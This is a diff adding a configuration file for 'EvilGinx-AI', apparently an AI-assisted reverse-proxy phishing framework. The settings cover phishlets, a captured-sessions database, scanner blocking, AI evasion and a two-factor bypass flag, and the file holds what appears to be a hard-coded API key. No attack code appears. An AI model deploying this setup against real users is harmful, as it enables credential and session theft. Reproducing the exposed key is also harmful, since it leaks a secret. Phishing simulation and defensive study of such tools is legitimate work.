@@ -1,0 +1,41 @@
+# EvilGinx-AI Configuration File
+
+# Server settings
+proxy_port: 8000
+proxy_ssl_port: 8443
+dns_port: 5353
+dashboard_port: 8080
+
+# AI settings
+gemini_api_key: 'AIzaSyAJFQ_m8mrEB8n_QfiO7nosPfz9wJAtk_0'
+ai_enabled: true
+ai_detection_enabled: true
+ai_content_generation: true
+ai_evasion_enabled: true
+
+# Phishing settings
+phishlets_dir: 'phishlets'
+certificates_dir: 'certificates'
+database_file: 'database/sessions.db'
+
+# Security settings
+block_scanners: true
+block_known_ips: true
+enable_logging: true
+log_level: 'INFO'
+
+# Domain settings
+base_domain: 'phish-test.local'
+redirect_url: 'https://google.com'
+
+# SSL/TLS settings
+auto_ssl: true
+ssl_cert_path: ''
+ssl_key_path: ''
+
+# Advanced settings
+max_sessions: 1000
+session_timeout: 3600  # 1 hour
+enable_2fa_bypass: true
+capture_screenshots: false
+
